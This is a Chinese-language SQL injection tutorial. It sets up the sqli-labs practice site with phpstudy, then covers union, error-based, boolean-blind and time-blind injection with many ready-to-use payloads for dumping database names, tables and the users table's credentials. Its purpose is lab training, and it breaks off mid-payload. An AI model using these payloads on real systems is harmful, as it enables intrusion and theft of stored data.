# 利用phpstudy搭建sqli-labs靶场
参考文章[链接](https://blog.csdn.net/qq_44637753/article/details/127209670?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522fab0ce31fe04145dae6b47c8317a8b4a%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=fab0ce31fe04145dae6b47c8317a8b4a&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-127209670-null-null.142^v100^pc_search_result_base7&utm_term=phpstudy%E6%90%AD%E5%BB%BAsql-libs%E9%9D%B6%E5%9C%BA&spm=1018.2226.3001.4187#1sqlilabsmsterhttpsgithubcomAudi1sqlilabsarchiverefsheadsmasterzip_2)

## 官网下载phpstudy
选择v8.1 64位

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732180405274-00f75c3f-9ae4-4e75-aa4f-9bb96e688825.png)

## 下载sqli-labs靶场
下载源码[https://codeload.github.com/Audi-1/sqli-labs/zip/master](https://codeload.github.com/Audi-1/sqli-labs/zip/master)

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732181035361-50301f1f-e8c6-4b78-bde9-8eff1b458735.png)



## <font style="color:rgb(79, 79, 79);">安装插件、软件管理 --> 安装php5.4.45 + mysql5.5.29</font>
![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732181228575-e481b60e-364f-4c2b-ad4f-6082a64dce76.png)

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732181265918-bc0fac65-69ec-48c8-80b8-dd03a7ab0b85.png)

## <font style="color:rgb(79, 79, 79);">首页启动apache2.4.39、mysql5.5.29.</font>
![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732181380658-819ecb89-9602-4d98-9809-48b3f351f514.png)

## <font style="color:rgb(79, 79, 79);">修改配置、选择php5.4.45 版本。</font>
![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732181439360-d671a635-e68f-460f-9b12-6c98f3292a54.png)

## <font style="color:rgb(79, 79, 79);">把</font><font style="color:rgb(78, 161, 219) !important;">sqli-labs</font><font style="color:rgb(79, 79, 79);">-master解压到D:\phpstudy_pro\WWW下可以自行修改目录名称。</font>
![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732181187328-a453be4b-5af1-47a8-8dc8-bc129d4e7366.png?x-oss-process=image%2Fformat%2Cwebp)

## <font style="color:rgb(79, 79, 79);">修改D:\phpstudy_pro\WWW\sqllibs\sql-connection目录下db-creds.inc连接密码</font>
![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732181507328-4bee12ab-0678-43c8-9cc4-e293a812dd8d.png)

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732181570723-39951bef-8d96-4eff-9971-1b2fcde4fd65.png)

## <font style="color:rgb(79, 79, 79);">开启进程、访问</font>[http://127.0.0.1/sqli-labs-master/](http://127.0.0.1/sqli-labs-master/)
![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732184275341-604fbe5c-fb56-40bb-8c11-ae6ca90c6043.png)

## <font style="color:rgb(79, 79, 79);">访问页面为、点击Setup/reset Database for labs设置数据库。</font>
![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732191900354-fd66eaf8-bb76-4789-80b8-1a53419cb329.png)

重置成功

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732191982725-116db277-4195-45fc-aeca-d77e07eaa2ea.png)

安装完毕

# 关于SQL注入的基本概念和前置知识
参考文章[链接](https://blog.csdn.net/weixin_46428928/article/details/143755144?sharetype=blog&shareId=143755144&sharerefer=APP&sharesource=2301_82267803&sharefrom=qq) [链接](https://blog.csdn.net/m0_72210904/article/details/138446306?ops_request_misc=&request_id=&biz_id=102&utm_term=SQL%E6%B3%A8%E5%85%A5%E4%BA%A7%E7%94%9F%E7%9A%84%E6%9D%A1%E4%BB%B6&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-138446306.142^v100^pc_search_result_base7&spm=1018.2226.3001.4187)

## 什么是SQL注入？
<font style="color:rgb(77, 77, 77);">SQL 注入就是指 Web 应用程序对用户输入的数据合法性没有过滤或者是判断，攻击者可以在Web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</font>

## SQL注入产生的条件
**<font style="color:#601BDE;">传递给后端的参数是可以控制的</font>**

**<font style="color:#601BDE;">参数内容会被带入到数据库查询</font>**

**<font style="color:#601BDE;">变量未存在过滤或者过滤不严谨</font>**

## <font style="color:rgb(79, 79, 79);">关于Mysql数据库</font>
在 MySQL5.0 版本后，MySQL 默认在数据库中存放一个information_schema的数据库，该数据库中包含了当前系统中所有的数据库、表、列、索引、视图等相关的元数据信息，是MySql自身信息元数据的存储库，我们需要记住三个表名，分别是 schemata，tables，columns。

```php
schemata         # 存储的是该用户创建的所有数据库的库名，要记住该表中记录数据库名的字段名为 schema_name。
tables           # 存储该用户创建的所有数据库的库名和表名，要记住该表中记录数据库 库名和表名的字段分别是 table_schema 和 table_name.
columns          # 存储该用户创建的所有数据库的库名、表名、字段名，要记住该表中记录数据库库名、表名、字段名为 table_schema、table_name、column_name。
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732008924191-dfac06f2-f95c-4a7f-9a60-836400317f68.png)

常用的查询语句

```php
# 查询所有的数据库名
select schema_name from information_schema.schemata limit 0,1
# 查询指定数据库security中的所有表名
select table_name from information_schema.tables where table_schema='security' limit 0,1
# 查询指定数据库security中的指定数据表users的所有列名
select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1
```

### <font style="color:rgb(79, 79, 79);">Sql注入中Mysql常用函数</font>
<font style="color:rgb(77, 77, 77);">收集操作系统、数据库版本、数据库名字、数据库用户等信息，为后续注入做准备</font>

```sql
# 一些SQL注入常用的函数
version()                 # 查看数据库版本
database()                # 查看当前数据库名
user()                    # 查看当前数据库用户
system_user()             # 查看系统用户名
group_concat()            # 把数据库中的某列数据或某几列数据合并为一个字符串
@@datadir                 # 查看数据库路径
@@version_compile_os      # 查看操作系统
```

### <font style="color:rgb(79, 79, 79);">关于Mysql注释</font>
在 Sql 注入中，需要使用 Mysql 的注释符号，需要去注释注入语句后面的语句不被执行，Mysql中单行注释有两种方式，分别是#和-- (--后面有空格)

但是，需要注意的是，在url中，如果是get请求，解释执行的时候，url中#号是用来指导浏览器动作的，对服务器端无用。所以，HTTP请求中使用 get 传参时不包括#，因为使用 # 闭合无法注释，会报错；而使用-- （有个空格），在传输过程中空格会被忽略，同样导致无法注释，所以在get请求传参注入时才会使用 --+ 的方式来闭合，因为+会被解释成空格。

```php
也可以使用--%20，把空格转换为url encode编码格式，也不会报错。同理把 # 变成 %23 ,也不报错。
如果是post请求，则可以直接使用#来进行闭合。常见的就是表单注入，如我们在后台登录框中进行注入。
```

# SQL注入的类型和注入方法
## SQL注入按照注入点分类
常见的注入点分类有

```php
数值型注入（不需要考虑闭合）
字符型注入（需要闭合引号或者注释逃逸）
搜索型注入（即文本框注入）
```

### 数值型注入点
类似结构 [http://xxx.com/users.php?id=1](http://xxx.com/users.php?id=1) 基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如查看用户个人信息，查看文章等，大都会使用这种形式的结构传递id等信息，交给后端，查询出数据库中对应的信息，返回给前台。这一类的 SQL 语句原型大概为 "select * from 表名 where id=1" 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：

```php
select * from 表名 where id=1 and 1=1
#数字型驻点常见的注入语句(Payload)
#查询数据库名和版本
id=-1 union select 1,database(),version() --+
#查询指定数据库中的表名
id=-1 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=‘security’) --+
#查询指定数据库中指定表名中的列名字段
id=-1 union select 1,database(),(select group_concat(column_name) from information_schema.columns where table_schema=‘security’ and table_name=‘users’) --+
#查询指定表中的数据
id=-1 union select 1,database(),(select group_concat(username,‘:’,password) from secyrity.users) --+
```

### 字符型注入点
类似结构 [http://xxx.com/users.php?name=admin](http://xxx.com/users.php?name=admin) 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 "select * from 表名 where name='admin'" 值得注意的是这里相比于数字型注入类型的sql语句原型多了引号，可以是单引号或者是双引号。若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：

```php
select * from 表名 where name=‘admin’ and 1=1 ‘’
#字符型常见的注入语句(Payload)
#后台语句 - SELECT * FROM users WHERE id=(‘$id’) LIMIT 0,1
id=-1') union select 1,database(),version() --+
id=-2") union select 1,2,3–+
```

### 搜索型注入点
这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 keyword=关键字 ，有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：select * from 表名 where 字段 like '%关键字%' 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：

```php
select * from 表名 where 字段 like ‘%测试%’ and ‘%1%’=‘%1%’
```

## SQL注入常见的几种注入方法
### 联合查询(union注入)
联合查询适合于有显示位的注入，即页面某个位置会根据我们输入的数据的变化而变化

简单来说就是 <font style="color:rgb(77, 77, 77);">有注入点，且数据有回显，那就可以用联合查询注入</font>

<font style="color:rgb(77, 77, 77);">以sqli-labs第一关为例来简述联合查询注入的使用</font>

<font style="color:rgb(77, 77, 77);">如下，要求我们传入一个id值过去。传参?id=1，当我们输入id=1和id=2时，页面中name值和password的值是不一样的，说明此时我们输入的数据和数据库有交互并且将数据显示在屏幕上了</font>

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732018103160-fe63bb68-3546-43a5-82a8-baf7b1ab0ccf.png)

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732018120734-c4215b1d-8e6c-4e87-bd2b-e93ba45a8f17.png)

#### <font style="color:rgb(77, 77, 77);">1.注入点判断</font>
<font style="color:rgb(77, 77, 77);">开始判断是否存在注入，输入?id=1'，页面发生报错，说明后端对我前端的数据输入没有很好的过滤，产生了sql注入漏洞</font>

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732018250616-23f742da-482b-4d58-b5c6-bdaad3fa6f26.png)

<font style="color:rgb(77, 77, 77);">继续判断，输入 ?id=1' and 1=1 --+ 页面正常显示</font>

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732018317369-f1d539b5-99c0-4023-bd6e-d0b437d44f50.png)

<font style="color:rgb(77, 77, 77);">?id=1' and 1=2 --+ 页面不正常显示，说明程序对我们的输入做出了正确的判断，所以注入点就是单引号</font>

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732018384015-2f177204-30f3-4de4-8164-227f1f2e4e27.png)

<font style="color:rgb(77, 77, 77);">页面会根据输入的数据变化而变化，当存在注入点时，优先考虑使用联合注入手法。</font>

#### <font style="color:rgb(77, 77, 77);">2. 判断当前表的字段个数</font>
<font style="color:rgb(77, 77, 77);">输入order by 3，页面无异常反应</font>

```php
?id=1' order by 3 --+
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732018542008-269304b4-d035-4ae2-b156-11ad89a4101e.png)

<font style="color:rgb(77, 77, 77);">将3修改为4，此时显示未知的列，说明此时当前表中只有3列</font>

```php
?id=1' order by 4 --+ 
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732018700225-c0e0fe4d-c1ad-4308-a565-c9709381738b.png)

#### 3.判断显示位
<font style="color:rgb(77, 77, 77);">接下来测试我们的输入会在屏幕哪个地方进行回显。上面我们判断出来了表中有3列，所以union select的时候就写xx,xx,xx三个数据</font>

<font style="color:rgb(77, 77, 77);">需让union select前面的参数查不出来而回显后面的语句，所以id=-1'</font>

```php
?id=-1' union select 1,2,3 --+ 
```

<font style="color:rgb(77, 77, 77);">如下，在name和password值中回显了我们的输入，这时我们就可以在回显2或3的放置放入测试语句。</font>

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732018891035-d6681de4-f0d2-4091-9c2f-d4270bc2c949.png)

#### 4. 爆当前数据库名字
这里就需要结合上面的Mysql数据库的前置知识

```php
?id=-1' union select 1,2,database() --+
```

<font style="color:rgb(77, 77, 77);">获取当前数据库名为“security”</font>

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732019022965-1325b29d-ed8d-4643-9980-83cdc190cc5a.png)

#### 5.爆出当前数据库中的表
```php
#直接套用语句
?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732019338887-e739e57f-a73b-4a90-abb8-00db3bdd2c7e.png)

#### 6.爆出表中的字段
<font style="color:rgb(77, 77, 77);">我们这里选择users表进行进一步的获取表中的字段信息</font>

```php
#只需指定表名即可
?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' --+
#或者指定当前数据库名
?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' --+
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732019620468-a87dc0ee-52c5-457a-98d0-4925529448e6.png)

<font style="color:rgb(77, 77, 77);">获取"users"表中存在3个字段，分别为 "id,username,password"</font>

#### <font style="color:rgb(77, 77, 77);">7. 爆相应字段的所有数据</font>
```php
#只需指定表名和字段名
?id=-1' union select 1,2,group_concat(`id`,':',`username`,':',`password`) from users --+
#字段值不加反引号也可以
?id=-1' union select 1,2,group_concat(id,':',username,':',password) from users --+
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732019803477-b35607fa-e380-4bf3-a7fb-85558a314a79.png)

<font style="color:rgb(77, 77, 77);">至此，联合查询整个过程结束。注入的时候找到注入点后只需套入语句即可</font><font style="color:rgb(77, 77, 77);">。</font>

### 报错注入
参考文章[链接](https://blog.csdn.net/qq_55202378/article/details/134802038?ops_request_misc=&request_id=&biz_id=102&utm_term=sql%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-9-134802038.142^v100^pc_search_result_base7&spm=1018.2226.3001.4187)

<font style="color:#601BDE;">报错注入</font><font style="color:rgb(77, 77, 77);">用在数据库的错误信息会回显在网页中的情况，如果联合查询不能使用，首选</font><font style="color:#601BDE;">报错注入</font><font style="color:rgb(77, 77, 77);">。</font>  
<font style="color:#601BDE;">报错注入</font><font style="color:rgb(77, 77, 77);">利用的是数据库的报错信息得到数据库的内容，这里需要构造语句让数据库报错。</font>

#### <font style="color:rgb(79, 79, 79);">报错注入的前提条件</font>
```sql
web应用程序未关闭数据库报错函数，对于一些SQL语句的错误直接回显在页面上；
后台未对一些具有报错功能的函数（如extractvalue、updatexml等）进行过滤。
```

#### <font style="color:rgb(79, 79, 79);">相关报错函数</font>
##### （1）extractvlue()（Mysql数据库版本号>=5.1.5）
**作用：**对xml文档进行查询，相当于在HTML文件中用标签查找元素。

**语法：**extactvalue(XML_document, XPath_string)

**参数1：**XML_document是String格式，为XML文档对象的名称。

**参数2：**XPath_string（XPath格式的字符串），注入时可操作的地方。

**报错原理：**xml文档中查找字符位置使用/xxx/xxx/xxx/…这种格式，如果写入其他格式就会报错并且会返回写入的非法格式内容，错误信息如：XPATH syntax error: ‘xxxxx’。

**<font style="color:rgba(0, 0, 0, 0.75);">实例：</font>**

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732066784772-244f3ddd-0039-437c-8264-706c55055953.png)

注：该函数的最大显示长度为32，超过长度可以配合substr、limit等函数来显示。

##### （2）updatexml()（Mysql数据库版本号>=5.1.5）
**作用：**改变文档中符合条件的节点的值。

**语法：**updatexml(XML_document, XPath_string, new_value)

**参数1：**XML_document是String格式，为XML文档对象的名称。

**参数2：**XPath_string（XPath格式的字符串），注入时可操作的地方。

**参数3：**new_value，string格式，替换查找到的符合条件的数据

**报错原理：**与extractvalue()原理相同

**实例：**

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732067084206-277618ee-3252-4def-a575-f44bcae66145.png)

注：该函数的最大显示长度为32，超过长度可以配合substr、limit等函数来显示。

##### <font style="color:rgb(77, 77, 77);">（3）floor()、rand()、count()、group by联用</font>
**<font style="color:rgba(0, 0, 0, 0.75);">作用：</font>**

```sql
floor(x)：对参数向下取整
rand()：生成一个0-1之间的随机浮点数
count(*)：统计某个表下总共有多少条记录
group by X：按照by一定规则（x）进行分组
```

**<font style="color:rgba(0, 0, 0, 0.75);">报错原理：</font>**

<font style="color:rgba(0, 0, 0, 0.75);">group by和rand()使用时，如果临时表中没有该主键，则在插入前会再计算一次rand()，然后再由group by将就算出来的主键直接插入到临时表格中，导致主键重复报错，错误信息如下：</font>

<font style="color:#601BDE;">Duplicate entry '...' for key 'group_key'</font>

**<font style="color:#000000;">实例：  
</font>**![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732078537424-f0e05770-2df5-43c3-bd38-a78e5da40d14.png)

##### （4）exp()(5.5.5< = MYsql数据库版本<=5.5.49)
**作用：**计算以e（自然常数）为底的幂值；

**语法：**exp(x)

**报错原理：**当参数超过710时，exp()函数会报错，错误信息如下：<font style="color:#601BDE;">DOUBLE value is out of range:…</font>

**<font style="color:#000000;">实例：</font>**

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732078795345-2437e92f-4d4b-44fc-8655-75692eadf4b7.png)

#### 报错注入常用payload
##### <font style="color:#000000;">利用extractvalue()函数进行报错注入</font>
```sql
id=1' #   //报错，说明有注入点
id=1 and 1=1 # //正确
id=1 and 1=2 # //错误，说明是数字型注入，否则为字符型注入

id=1' and (select extractvalue(1,concat('~',(select database())))) --+ //爆出当前数据库名
id=1' and (select extractvalue(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema='数据库名')))) --+ //查看数据库中的表
id=1' and (select extractvalue(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_schema='数据库名' and table_name='表名')))) --+ //查看表中的字段名
id=1' and (select extractvalue(1,concat('~',(select group_concat(concat(字段1,'%23',字段2))))) --+ //查看字段内容
```

##### <font style="color:#000000;">利用updataxml()函数进行报错注入</font>
```sql
id=1' #   //报错，说明有注入点
id=1 and 1=1 # //正确
id=1 and 1=2 # //错误，说明是数字型注入，否则为字符型注入

id=1' and (select updatexml(1,concat('~ ',(select database()), '~'),1)) --+ //爆出当前数据库名
id=1' and (select updatexml(1,concat('~ ',(select group_concat(table_name) from information_schema.tables where table_schema='数据库名'), '~'),1)) //查看数据库中的表
id=1' and (select updatexml(1,concat('~ ',(select group_concat(column_name) from information_schema.columns where table_schema='数据库名' and table_name='表名'), '~'),1)) //查看表中的字段名
id=1' and (select updatexml(1,concat('~ ',(select group_concat(concat(字段1,'%23',字段2))), '~'),1)) --+ //查看字段内容
```

##### <font style="color:#000000;">利用floor()函数进行报错注入</font>
```sql
id=1' #   //报错，说明有注入点
id=1 and 1=1 # //正确
id=1 and 1=2 # //错误，说明是数字型注入，否则为字符型注入

id=1' and (select 1 from (select count(*),concat((select database()),floor(rand()*2))x from information_schema.tables group by x)a) --+ //爆出当前数据库名
id=1' and (select 1 from (select count(*),concat((select group_concat(table_name) from information_schema.tables where table_schema='数据库名'),floor(rand()*2))x from information_schema.tables group by x)a) --+  //查看数据库的表名
id=1' and (select 1 from (select count(*),concat((select group_concat(column_name) from information_schema.columns where table_schema='数据库名' and table_name='表名'),floor(rand()*2))x from information_schema.tables group by x)a) --+  //查看表中的字段名
id=1' and (select 1 from (select count(*),concat((select group_concat(concat(字段1,'%23',字段2))),floor(rand()*2))x from information_schema.tables group by x)a) --+  //查看字段内容
```

### 基于布尔的盲注（布尔盲注）
参考文章[链接](https://blog.csdn.net/qq_44159028/article/details/114325805?sharetype=blog&shareId=114325805&sharerefer=APP&sharesource=2301_82267803&sharefrom=qq)

<font style="color:#601BDE;">布尔盲注</font><font style="color:rgb(77, 77, 77);">，即在页面没有错误回显时完成的注入攻击。此时我们输入的语句让页面呈现出两种状态，相当于true和false，根据这两种状态可以判断我们输入的语句是否查询成功。</font>

<font style="color:rgb(77, 77, 77);">我们构造判断语句，根据页面是否回显证实猜想。一般用到的函数ascii() 、substr() 、length()，exists()、concat()等。</font>

<font style="color:rgb(77, 77, 77);">函数的作用可以参考这篇</font>[<font style="color:rgb(77, 77, 77);">链接</font>](https://blog.csdn.net/m0_75178803/article/details/133968302?ops_request_misc=%257B%2522request%255Fid%2522%253A%25226a0685b97a9b0b7363f081d23ae7c866%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=6a0685b97a9b0b7363f081d23ae7c866&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-4-133968302-null-null.142%5Ev100%5Epc_search_result_base7&utm_term=sql%E6%B3%A8%E5%85%A5%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E6%89%80%E7%94%A8%E7%9A%84%E5%87%BD%E6%95%B0&spm=1018.2226.3001.4187)

<font style="color:rgb(77, 77, 77);">大致步骤为</font>

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732080195795-0440cd74-c67d-40d3-8034-a1a83e736af3.png)

#### 注入方法
这里以靶场<font style="color:rgb(252, 85, 49) !important;">sqli-labs</font><font style="color:rgb(79, 79, 79);">>>less-5为例子大概叙述布尔盲注</font>

<font style="color:rgb(79, 79, 79);">注：由于布尔盲注工作量很大  不支持手搓 不管是在做题还是实战中都会配合sql注入自动化工具使用</font>

<font style="color:rgb(79, 79, 79);">       </font><font style="color:#601BDE;">这里只大概展示bool盲注的原理(相当于对着答案来做题 而且省略一些机械重复的步骤)</font>

##### <font style="color:#000000;">判断页面的true和fasle</font>
输入payload

```sql
http://710deee6-f4db-4caa-bb69-4456a943ed13.node5.buuoj.cn/Less-5/?id=1' and 1=1--+
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732081367656-7a24a7ab-cd4b-46f1-838c-e2d088e52ad5.png)

接着输入payload

```sql
http://710deee6-f4db-4caa-bb69-4456a943ed13.node5.buuoj.cn/Less-5/?id=1' and 1=2--+
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732081399310-ca2d265a-71f2-4955-befe-8b3f78a2ea17.png)

所以判断当页面出现  <font style="color:#601BDE;">You are in............. </font><font style="color:#000000;"> 时为true</font>

##### <font style="color:rgb(79, 79, 79);">猜测当前数据库长度：</font>
```sql
http://127.0.0.1/sqlilabs/Less-5/?id=1' and length(database())=8 %23
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732081772657-ced35f5a-4ce2-4a49-884e-ebdfdcc09069.png)

<font style="color:rgb(77, 77, 77);">长度为8时返回正确页面，所以数据库长度为8.</font>

<font style="color:#601BDE;">注：得到长度8是通过一个数一个数试出来的 一般都是使用脚本 不支持手搓 包括后面的猜表名和数        据内容  也是将字符转化成ascii码后 通过判断页面反馈一个个拼接起来的</font>

##### <font style="color:rgb(79, 79, 79);">猜测当前数据库名</font>
<font style="color:rgb(77, 77, 77);">使用left()函数进行夹逼</font><font style="color:#601BDE;">（使用其他截取字符的函数也是同样的道理 只不过格式会有些许差异）</font>  
<font style="color:rgb(77, 77, 77);">猜测当前数据库名的第一位字符：</font>

```sql
http://127.0.0.1/sqlilabs/Less-5/?id=1' and left(database(),1)>'r'%23
http://127.0.0.1/sqlilabs/Less-5/?id=1' and left(database(),1)<'t'%23
```

结果都为

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732082313865-f65072c1-4590-4203-a872-e05fab13c26d.png)

由于 'r'<'当前数据库名的第一位字符'<'t'

<font style="color:rgb(77, 77, 77);">所以当前数据库名的第一位字符为's'。</font>

<font style="color:rgb(77, 77, 77);">猜测当前数据库名的第二位字符：</font>

<font style="color:rgb(77, 77, 77);">payload:</font>

```sql
http://127.0.0.1/sqlilabs/Less-5/?id=1' and left(database(),2)>'sd'%23
http://127.0.0.1/sqlilabs/Less-5/?id=1' and left(database(),2)<'sf'%23
```

两个结果都为

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732082479485-cccc0a62-a28f-4d03-8668-c3d646366397.png)

由于 'sd'<'当前数据库名的前两位字符'<'sf'

<font style="color:rgb(77, 77, 77);">所以当前数据库名的第二位字符为'e’</font>

<font style="color:rgb(77, 77, 77);">以此类推，最后得到当前数据库名为“security”。</font><font style="color:#601BDE;">(这里都是机械重复操作 方法都是一样的)</font>

##### <font style="color:rgb(79, 79, 79);">猜测当前数据库的表名</font>
<font style="color:rgb(77, 77, 77);">猜测第一个数据表名的第一个字符：</font>

<font style="color:rgb(77, 77, 77);">payload:</font>

```sql
http://127.0.0.1/sqlilabs/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100%23
http://127.0.0.1/sqlilabs/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<102%23
```

<font style="color:#601BDE;">注：字符'd'的ascii码值为100 字符'f'的ascii码值为102 这里用的是ascii函数和substr函数来截取比较</font>

<font style="color:#601BDE;">       道理和方法都是一样的</font>

<font style="color:#000000;">结果都为</font>

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732083056851-10100eb7-35f8-4412-9530-b8f42a94187c.png)

所以 'd'<'当前数据库第一个表名的第一个字符'<'f'

<font style="color:rgb(77, 77, 77);">当前数据库第一个表名的第一个字符为'e'。</font>

<font style="color:rgb(77, 77, 77);">以此类推，当前数据库第一个表名为'email'。</font>

##### <font style="color:rgb(79, 79, 79);">猜测当前数据表的字段：</font>
<font style="color:rgb(77, 77, 77);">猜测当前数据表的第四个字段的第一个字符：</font>

同样的方法 只是payload有点区别

```sql
http://127.0.0.1/sqlilabs/Less-5/?id=1' and ascii(substr((select column_name from information_schema.columns where table_name="users" limit 3,1),1,1))>104%23
http://127.0.0.1/sqlilabs/Less-5/?id=1' and ascii(substr((select column_name from information_schema.columns where table_name="users" limit 3,1),1,1))<106%23
```

结果都为

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732084297162-75420d50-ab91-4963-9357-e5b8dc05b853.png)

由于 'h'<'当前数据表的第四个字段的第一个字符'<'j'

所以 <font style="color:rgb(77, 77, 77);">当前数据表的第四个字段的第一个字符为'i'</font>

<font style="color:rgb(77, 77, 77);">类推，当前数据表的第四个字段为'id'。</font>

##### <font style="color:rgb(79, 79, 79);">猜测当前字段的数据项：</font>
<font style="color:rgb(77, 77, 77);">猜测当前字段第一个数据项的第一个字符：</font>

<font style="color:rgb(77, 77, 77);">payload:</font>

```sql
http://127.0.0.1/sqlilabs/less-5/?id=1' ascii(substr((select username from security.users order by id limit 0,1),1,1))>67%23 
http://127.0.0.1/sqlilabs/less-5/?id=1' ascii(substr((select username from security.users order by id limit 0,1),1,1))<69%23 
```

<font style="color:rgb(0, 153, 0) !important;">由于  'C'</font><font style="color:rgb(79, 79, 79);background-color:rgb(246, 248, 250);"><</font><font style="color:rgb(0, 153, 0) !important;">'当前字段的第一个数据项的第一个字符'</font><font style="color:rgb(79, 79, 79);background-color:rgb(246, 248, 250);"><</font><font style="color:rgb(0, 153, 0) !important;">'E'</font>

<font style="color:rgb(0, 153, 0) !important;">所以 </font><font style="color:rgb(77, 77, 77);">当前字段的第一个数据项的第一个字符为'D'。</font>

<font style="color:rgb(77, 77, 77);">以此类推，当前字段的第一个数据项为'Dumb'。</font>

<font style="color:rgb(77, 77, 77);">同样的方法可以推出‘password’字段的第一个数据项为'Dumb'。</font>

### 基于时间的盲注（延时盲注）
#### <font style="color:rgb(79, 79, 79);">延时盲注原理</font>
<font style="color:#601BDE;">延时盲注</font><font style="color:rgb(77, 77, 77);">，也称为时间盲注或延迟注入，是一种</font>[SQL盲注](https://so.csdn.net/so/search?q=SQL%E7%9B%B2%E6%B3%A8&spm=1001.2101.3001.7020)<font style="color:rgb(77, 77, 77);">的手法。其原理在于利用执行时间差来判断是否执行成功。攻击者提交一个对执行时间敏感的SQL语句，通过执行时间的长短来判断注入是否成功。如果注入成功，执行时间会变长；如果注入失败，执行时间则会变短。</font>

<font style="color:rgb(77, 77, 77);">以靶场sqli-labs less9为例</font>

<font style="color:rgb(77, 77, 77);">在尝试了N种闭合方式之后发现页面的回显都是一样的并且没有任何报错信息，尝试延时盲注</font>

```sql
/?id=1' and (sleep(5))--+
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1732085943526-e689154a-2ef4-482d-a790-f4f0a8e0cff8.png)

发现如果输入的内容为真的话 响应会延时5秒 以此作为是否正确的判断条件

<font style="color:#601BDE;">注：和布尔盲注原理很像 都是通过判断字符是否正确来拼接像要查找的数据  同样也用到了布尔盲注中截取 字符串的函数 工作量同样很大 也是需要配合sql注入的自动化工具的使用 不支持手搓 </font>

#### 延时注入中使用的函数
##### <font style="color:rgb(79, 79, 79);">sleep()</font>
<font style="color:rgb(77, 77, 77);">语法：</font>

```sql
sleep(参数)

#参数为休眠时长，以秒为单位，可以为小数
```

<font style="color:rgb(77, 77, 77);">用法：</font>

```sql
SELECT sleep(3);

#延迟3秒查询
```

##### <font style="color:rgb(79, 79, 79);">if()</font>
语法：

```sql
if(condition，true，false)
```

用法：

```sql
SELECT if(1=1,sleep(0),sleep(3));
#1=1为True，响应延迟0秒

SELECT if(1=2,sleep(0),sleep(3));
#1=2为False，响应延迟3秒
```

#### payload的构建
```sql
?id=1' and if(ascii(substr((select database()),1,1))>=ASCII码,sleep(0),sleep(3))--+

?id=1' and if(ascii(substr((select database()),1,1))<=ASCII码,sleep(0),sleep(3))--+

#用二分法将第一位字符验证出来

?id=1' and if(ascii(substr((select database()),2,1))>=ASCII码,sleep(0),sleep(3))--+

